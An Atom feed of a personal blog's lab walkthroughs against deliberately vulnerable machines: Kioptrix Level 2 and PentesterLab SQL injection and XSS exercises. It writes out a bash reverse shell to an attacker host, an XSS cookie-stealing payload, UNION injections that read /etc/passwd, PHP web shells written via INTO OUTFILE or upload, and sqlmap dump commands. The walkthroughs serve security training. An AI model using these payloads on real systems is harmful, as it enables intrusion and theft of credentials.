<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: sql injection | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/sql-injection/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2017-01-25T13:58:13-06:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[vulhub-Kioptrix Level 2]]></title>
    <link href="http://wg135.github.io/blog/2016/06/07/vulhub-kioptrix2/"/>
    <updated>2016-06-07T15:56:48-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/07/vulhub-kioptrix2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>zap</li>
<li>netcat</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.183 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.183 -p-</code></p>

<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>

<pre><code>Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-07 16:07 CDT
NSE: Loaded 138 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:07
Completed NSE at 16:07, 0.00s elapsed
Initiating NSE at 16:07
Completed NSE at 16:07, 0.00s elapsed
Initiating ARP Ping Scan at 16:07
Scanning 192.168.79.183 [1 port]
Completed ARP Ping Scan at 16:07, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:07
Completed Parallel DNS resolution of 1 host. at 16:08, 13.00s elapsed
Initiating SYN Stealth Scan at 16:08
Scanning 192.168.79.183 [65535 ports]
Discovered open port 443/tcp on 192.168.79.183
Discovered open port 3306/tcp on 192.168.79.183
Discovered open port 111/tcp on 192.168.79.183
Discovered open port 22/tcp on 192.168.79.183
Discovered open port 80/tcp on 192.168.79.183
Discovered open port 666/tcp on 192.168.79.183
Discovered open port 631/tcp on 192.168.79.183
Completed SYN Stealth Scan at 16:08, 3.99s elapsed (65535 total ports)
Initiating Service scan at 16:08
Scanning 7 services on 192.168.79.183
Completed Service scan at 16:08, 16.01s elapsed (7 services on 1 host)
Initiating OS detection (try #1) against 192.168.79.183
NSE: Script scanning 192.168.79.183.
Initiating NSE at 16:08
Completed NSE at 16:08, 2.14s elapsed
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
Nmap scan report for 192.168.79.183
Host is up (0.00052s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            663/udp  status
|_  100024  1            666/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
|_ssl-date: 2016-06-07T17:59:07+00:00; -3h09m26s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
666/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:55:D2:EE (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Uptime guess: 0.018 days (since Tue Jun  7 15:42:38 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=201 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.79.183

NSE: Script Post-scanning.
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
Initiating NSE at 16:08
Completed NSE at 16:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.28 seconds
           Raw packets sent: 65555 (2.885MB) | Rcvd: 65551 (2.623MB)
</code></pre>

<p>Use Nikto to scan  the web service.</p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>not so excited.</p>

<p>check the webpage:</p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>may contain SQL injection. Use zap to scan:</p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Finally try username as <code>test</code>, password <code>test' or '1'=1'</code> can bypass the login.</p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Now I am looking for command injection:</p>

<p>try:</p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get:</p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Okay. Now set up netcat on port 4444 and in the web console:</p>

<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>But not the root. Keep going&hellip;</p>

<p>After enumeration, I found the kernel version is 2.6.9. Now search the exploit</p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Find an interestig one. I tried other exploits too, but failed..</p>

<p>Upload it to the target, compile and run it. ROOT:</p>

<p><img src="/images/blog/vulhub/kioptrix2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--Xss and MySQL FILE]]></title>
    <link href="http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file/"/>
    <updated>2016-04-12T13:19:35-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/12/pentesterlab-xss-and-mysql-file</id>
    <content type="html"><![CDATA[<p><em>It is time for you to act, LORD; your law is being broken.</em> &mdash; Psalm 119:126</p>

<p>This course details the exploitation of a Cross-Site Scripting in a PHP based website and how an attacker can use it to gain access to the administration pages. Then, using this access, the attacker will be able to gain code execution on the server using SQL injections.</p>

<p>From Pentesterlab:</p>

<p>The attack is divided into 2 steps:</p>

<ol>
<li>Detection and exploitation of Cross-Site Scripting vulnerabilities: in this part, you will learn how to detect and exploit Cross-Site Scripting vulnerabilities.</li>
<li>Access to the administration pages, then find and exploit a SQL injection to gain code execution. The last step in which you will access the operating system and run command.</li>
</ol>


<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>wfuzz</li>
<li>Zap</li>
<li>Firebug</li>
<li>Cookie Manager+</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
<li>Burte force hidden path of the server. &mdash;-wfuzz</li>
<li>Indetify XSS vuln and scan the website pages. &mdash;-Zap</li>
<li>Embeded script into page. &mdash;- Firebug</li>
<li>Deploy web shell.</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><code>nmap -sV -v -A 192.168.79.168</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Also I lauched zap to scan the website, try to find interesting things such as injection points and hidden pages. two things are very interesting. First of all, zap raises a flag for a xss vulnerability:</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>it looks like zap has already inject <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> into that page. If you visit the link &ldquo;<a href="http://192.168.79.168/post.php?id=1">http://192.168.79.168/post.php?id=1</a>&rdquo;, it will pop up an alert 1.</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>We can use this xss vulnerability to steal admin&rsquo;s cookie.</p>

<p>keep going &hellip;</p>

<p>Before stealing admin&rsquo;s cookie, we have to setup listener on attacking machine,</p>

<p><code>python -m SimpleHTTPServer 4444</code></p>

<p>use this payload instead of alert(1) in the xss (use firebug to edit the html)</p>

<p><code>&lt;script&gt;document.write('&lt;img src="http://192.168.79.156:4444/?'+document.cookie+'  "/&gt;');&lt;/script&gt;</code></p>

<p>192.168.79.156 is attacker&rsquo;s machine.</p>

<p>Now we got the cookie.</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>put the cookie in Cookie Manager+</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>now visit <code>http://192.168.79.168/admin/</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Let&rsquo;s explore the admin&rsquo;s pages. First, click <code>edit</code>, it will go to <code>http://192.168.79.168/admin/edit.php?id=2</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>now looks like the url contains injection point, lets try to use single quote:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=2'</code></p>

<p>we get error message:</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we know that the web sites' absolute path is &ldquo;/var/www/&rdquo;</p>

<p>From <a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course">pentesterlab</a></p>

<p>Exploiting SQL injection using UNION follows the steps below:</p>

<p> 1   Find the number of columns to perform the UNION
 2   Find what columns are echoed in the page
 3   Retrieve information from the database meta-tables
 4   Retrieve information from other tables/databases</p>

<p>In order to perform a request by SQL injection, you need to find the number of columns that are returned by the first part of the query. Unless you have the source code of the application, you will have to guess this number.</p>

<p>There are two methods to get this information:</p>

<p>1   using UNION SELECT and increase the number of columns;
2   using ORDER BY statement.</p>

<p>Here we use order by statement to get the number of columns</p>

<p><code>http://192.168.79.168/admin/edit.php?id=2 order by 4 --</code> good
<code>http://192.168.79.168/admin/edit.php?id=2 order by 5 --</code> error</p>

<p>Now that we know the number of columns, we can retrieve information from the database. Based on the error message we received, we know that the backend database used is MySQL.</p>

<p>get DB version:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,@@version,4</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>get /etc/passwd file:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,load_file("/etc/passwd"),4</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>get user info:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,user(),4</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>since the user is root, now we can deploy a webshell&hellip;</p>

<p>use <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> to create evil.php under css folder. Encode <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> part.</p>

<p>Now we can see that the evil.php is created successfully.</p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>Cool&hellip; Lets write webshell now</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>

<p>of course. encode <code>0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>

<p>Now run command:</p>

<p><code>http://192.168.79.168/css/webshell.php?c=cat /etc/passwd</code></p>

<p>encode <code>/etc/passwd</code></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/xssandmysql/tumblr_nqnzzzQJGq1rbc9h1o1_500.gif" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--From SQL Injection to Shell]]></title>
    <link href="http://wg135.github.io/blog/2016/03/29/pentesterlab/"/>
    <updated>2016-03-29T15:16:56-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/29/pentesterlab</id>
    <content type="html"><![CDATA[<p><em>All warfare is based on deception. Hence, when we are able to attack, we must seem unable; when using our forces, we must appear inactive; when we are near, we must make the enemy believe we are far away; when far away, we must make him believe we are near.</em> &mdash;&ndash; The Art of War</p>

<p>This course details the exploitation of SQL injection in a PHP based website and how an attacker can use it to gain access to the administration pages.</p>

<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>NC</li>
<li>wfuzz</li>
<li>sqlmap</li>
<li>Burp</li>
<li>webshell</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;-Nmap</li>
<li>Check php version and other http headers. &mdash;-NC</li>
<li>Scan all requests and pages. &mdash;-wfuzz</li>
<li>SQL injection and get admin password. &mdash;- sqlmap</li>
<li>Get the php request path. &mdash;-Burp</li>
<li>Get the web shell &mdash;- webshell</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>By checking the application HTTP headers with nc, I can get php version.</p>

<pre><code>GET / HTTP/1.1
Host: 192.168.79.165
</code></pre>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>The tool wfuzz can be used to detect directories and pages on the web server using brute force.</p>

<pre><code> python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://192.168.79.165/FUZZ 
</code></pre>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<pre><code> python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://192.168.79.165/FUZZ.php 
</code></pre>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<h4>Attack</h4>

<p>There is one page I want to try cat.php</p>

<p>In order to upload my websell, one thing I need to do is get admin. I use sqlmap to dump user&rsquo;s information:</p>

<p><code>sqlmap -u " sqlmap -u "http://192.168.79.165/cat.php?id=2" --dump"</code>, after a while, I got this:</p>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like I get the admin&rsquo;s password is P4ssw0rd and md5 hash. I also use John and ripper to verifyed the md5, the result matches P4ssw0rd.</p>

<p>Lets try to login use this password:</p>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>success&hellip;.. keep going.</p>

<p>There is a page can be used to upload new picture.
<img src="/images/blog/pentesterlab/fromsqltoshell/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Let&rsquo;s try to upload php web shell.
<code>php upload1.php
&lt;?php
  system($_GET["cmd"]);
?&gt;
</code></p>

<p>The result is:</p>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>The application filters .php file.</p>

<p>Okay, let&rsquo;s try to change the file name to upload2.php3 with the same code.</p>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>done</p>

<p>Then I want to get the path to that page using Burp</p>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>get the shell:</p>

<p><img src="/images/blog/pentesterlab/fromsqltoshell/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PentesterLab -- Web for Pentester - SQL Injection]]></title>
    <link href="http://wg135.github.io/blog/2016/02/20/pentesterlab-web-for-pentester-sql-injection/"/>
    <updated>2016-02-20T16:14:10-06:00</updated>
    <id>http://wg135.github.io/blog/2016/02/20/pentesterlab-web-for-pentester-sql-injection</id>
    <content type="html"><![CDATA[<p>Web for Pentester:
    This exercise is a set of the most common web vulnerability</p>

<p>Difficluty: 1/5</p>

<!--more-->


<h3>Example 1</h3>

<p>code review:
```php example1.php
&lt;?php</p>

<p>  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);
    $sql = &ldquo;SELECT * FROM users where name=&lsquo;&rdquo;;
    $sql .= $_GET[&ldquo;name&rdquo;].&ldquo;&rsquo;&rdquo;;<br/>
    $result = mysql_query($sql);
    if ($result) {
        ?>
        <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
        &lt;?php
        while ($row = mysql_fetch_assoc($result)) {
            echo &ldquo;<tr>&rdquo;;
                echo &ldquo;<td>&rdquo;.$row[&lsquo;id&rsquo;].&ldquo;</td>&rdquo;;
                echo &ldquo;<td>&rdquo;.$row[&lsquo;name&rsquo;].&ldquo;</td>&rdquo;;
                echo &ldquo;<td>&rdquo;.$row[&lsquo;age&rsquo;].&ldquo;</td>&rdquo;;
            echo &ldquo;</tr>&rdquo;;
        } <br/>
        echo &ldquo;</table>&rdquo;;
    }
  require_once &lsquo;../footer.php&rsquo;;
?></p>

<pre><code>
There is a vulnerability due to no input validation on parameter $_GET[“name”], so I can hack it directly by injecting `' or  1=1 #`. After injection, $sql now is `SELECT * FROM users where name=''  or  1=1 #`. This sql injection will pull all items in the table users.

Manually exploit (encode root' or 1=1#):

`http://192.168.79.162/sqli/example1.php?name=root%27%20or%201%3D1%23`


<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql1_manual.JPG" title="[title manually exploit [alt text]]" >

sqlmap exploit:

`sqlmap -u "http://192.168.79.162/sqli/example1.php?name=root"  --dump`


<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql1_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" >   





###Example 2

code review:
</code></pre>

<p>&lt;?php
  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);</p>

<pre><code>if (preg_match('/ /', $_GET["name"])) {
    die("ERROR NO SPACE");  
}
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";

$result = mysql_query($sql);
if ($result) {
    ?&gt;
    &lt;table class='table table-striped'&gt;
  &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;
    &lt;?php
    while ($row = mysql_fetch_assoc($result)) {
        echo "&lt;tr&gt;";
            echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
        echo "&lt;/tr&gt;";
    }   
    echo "&lt;/table&gt;";
}
</code></pre>

<p>  require &lsquo;../footer.php&rsquo;;
?></p>

<pre><code>
The author filtered the space in the user input. It prevents us from using the  ` '  or  1=1  #`. However, this filtering is easily bypassed, using tabulation (HT or \t) or comment /**/


Manually exploit (encode '/\*\*/or/\*\*/1=1/\*\*/#):

`http://192.168.79.162/sqli/example2.php?name=root%27%2f%2a%2a%2for%2f%2a%2a%2f1%3D1%2f%2a%2a%2f%23`


<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql2_manual.JPG" title="[title manually exploit [alt text]]" >

sqlmap exploit:

`sqlmap -u "http://192.168.79.162/sqli/example2.php?name=root" --dump --tamper=space2comment`

space2comment.py --- Replaces space character (' ') with comments '/**/'


<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql2_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" > 




###Example 3

code review:
</code></pre>

<p>&lt;?php
    require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);
    if (preg_match(&lsquo;/\s+/&rsquo;, $<em>GET[&ldquo;name&rdquo;])) {
        die(&ldquo;ERROR NO SPACE&rdquo;);<br/>
    }
    $sql = &ldquo;SELECT * FROM users where name=&lsquo;&rdquo;;
    $sql .= $</em>GET[&ldquo;name&rdquo;].&ldquo;&rsquo;&rdquo;;</p>

<pre><code>$result = mysql_query($sql);
if ($result) {
    ?&gt;
    &lt;table class='table table-striped'&gt;
  &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;
    &lt;?php
    while ($row = mysql_fetch_assoc($result)) {
        echo "&lt;tr&gt;";
            echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
        echo "&lt;/tr&gt;";
    }   
    echo "&lt;/table&gt;";
}
require '../footer.php';
</code></pre>

<p>?></p>

<pre><code>
The author filtered the spaces and tabulations in the user input. It prevents us from using the  ` '  or  1=1  #`. However, this filtering is easily bypassed, using comment /**/

Manually exploit (encode '/\*\*/or/\*\*/1=1/\*\*/#):

`http://192.168.79.162/sqli/example3.php?name=root%27%2f%2a%2a%2for%2f%2a%2a%2f1%3D1%2f%2a%2a%2f%23`


<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql3_manual.JPG" title="[title manually exploit [alt text]]" >

sqlmap exploit:

`sqlmap -u "http://192.168.79.162/sqli/example3.php?name=root" --dump --tamper=space2comment`

space2comment.py --- Replaces space character (' ') with comments '/**/'


<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql3_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" > 




###Example 4

code review:
</code></pre>

<p>&lt;?php
  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);
  $sql=&ldquo;SELECT * FROM users where id=&rdquo;;
    $sql.=mysql_real_escape_string($_GET[&ldquo;id&rdquo;]).&ldquo; &rdquo;;
    $result = mysql_query($sql);</p>

<pre><code>if ($result) {
    ?&gt;
    &lt;table class='table table-striped'&gt;
  &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;

    &lt;?php
    while ($row = mysql_fetch_assoc($result)) {
        echo "&lt;tr&gt;";
            echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
        echo "&lt;/tr&gt;";
    }   
    echo "&lt;/table&gt;";
}
require '../footer.php';
</code></pre>

<p>?></p>

<pre><code>
The developer use mysql_real_escape_string function to filter space. However, it cannot prevent sql injection without single quote.

Manually exploit (encode id=2 or 1=1 )

`http://192.168.79.162/sqli/example4.php?id=2 or 1=1 `

<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql4_manual.JPG" title="[title manually exploit [alt text]]" >

sqlmap exploit

`sqlmap -u "http://192.168.79.162/sqli/example4.php?id=2" --dump`

<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql4_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" > 



###Example 5

code review:
</code></pre>

<p>&lt;?php</p>

<p>  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);
    if (!preg_match(&lsquo;/^[0-9]+/&rsquo;, $<em>GET[&ldquo;id&rdquo;])) {
        die(&ldquo;ERROR INTEGER REQUIRED&rdquo;);<br/>
    }
    $sql = &ldquo;SELECT * FROM users where id=&rdquo;;
    $sql .= $</em>GET[&ldquo;id&rdquo;] ;</p>

<pre><code>$result = mysql_query($sql);

if ($result) {
    ?&gt;
    &lt;table class='table table-striped'&gt;
  &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;
    &lt;?php
    while ($row = mysql_fetch_assoc($result)) {
        echo "&lt;tr&gt;";
            echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
        echo "&lt;/tr&gt;";
    }   
    echo "&lt;/table&gt;";
}
require '../footer.php';
</code></pre>

<p>?></p>

<pre><code>
The developer use preg_match('/^[0-9]+/', $_GET["id"]) to prevent SQL injection by using a regular expression. However, it only ensures that the parameter id starts with a digit.

Manually exploit (encode id=2 or 1=1 #)

`http://192.168.79.162/sqli/example5.php?id=2 or 1=1 #`

<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql5_manual.JPG" title="[title manually exploit [alt text]]" >

sqlmap exploit

`sqlmap -u "http://192.168.79.162/sqli/example5.php?id=2" --dump`

<img src="/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql5_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" > 


###Example 6

code review:
</code></pre>

<p>&lt;?php</p>

<p>   require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);
    if (!preg_match(&lsquo;/[0-9]+$/&rsquo;, $<em>GET[&ldquo;id&rdquo;])) {
        die(&ldquo;ERROR INTEGER REQUIRED&rdquo;);<br/>
    }
    $sql = &ldquo;SELECT * FROM users where id=&rdquo;;
    $sql .= $</em>GET[&ldquo;id&rdquo;] ;</p>

<pre><code>$result = mysql_query($sql);
</code></pre>

<p>if ($result) {
        ?>
        <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
        &lt;?php
        while ($row = mysql_fetch_assoc($result)) {
            echo &ldquo;<tr>&rdquo;;
                echo &ldquo;<td>&rdquo;.$row[&lsquo;id&rsquo;].&ldquo;</td>&rdquo;;
                echo &ldquo;<td>&rdquo;.$row[&lsquo;name&rsquo;].&ldquo;</td>&rdquo;;
                echo &ldquo;<td>&rdquo;.$row[&lsquo;age&rsquo;].&ldquo;</td>&rdquo;;
            echo &ldquo;</tr>&rdquo;;
        } <br/>
        echo &ldquo;</table>&rdquo;;
    }
    require &lsquo;../footer.php&rsquo;;
?>
<code>``
